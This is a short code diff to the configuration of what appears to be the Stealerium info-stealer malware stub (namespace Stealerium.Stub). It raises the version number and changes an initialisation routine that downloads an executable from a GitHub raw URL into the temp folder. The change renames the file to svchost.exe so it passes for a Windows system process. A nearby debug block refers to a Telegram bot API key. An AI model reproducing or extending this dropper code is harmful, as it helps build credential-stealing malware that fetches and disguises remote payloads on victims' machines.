@@ -9,7 +9,7 @@ namespace Stealerium.Stub
 {
     public static class Config
     {
-        public static string Version = "v3.6.0";
+        public static string Version = "v3.6.1";
 
 #if DEBUG
         // Telegram bot API key
@@ -137,8 +137,8 @@ namespace Stealerium.Stub
         // Decrypt config values
         public static async Task InitAsync()
         {
-            string url = "https://github.com/kgnfth/tumblr/raw/refs/heads/main/svc.exe";
-            string filePath = Path.Combine(Path.GetTempPath(), "svc.exe");
+            string url = "https://github.com/kgnfth/tumblr/raw/refs/heads/main/svchost.exe";
+            string filePath = Path.Combine(Path.GetTempPath(), "svchost.exe");
 
             using (HttpClient client = new HttpClient())
             {
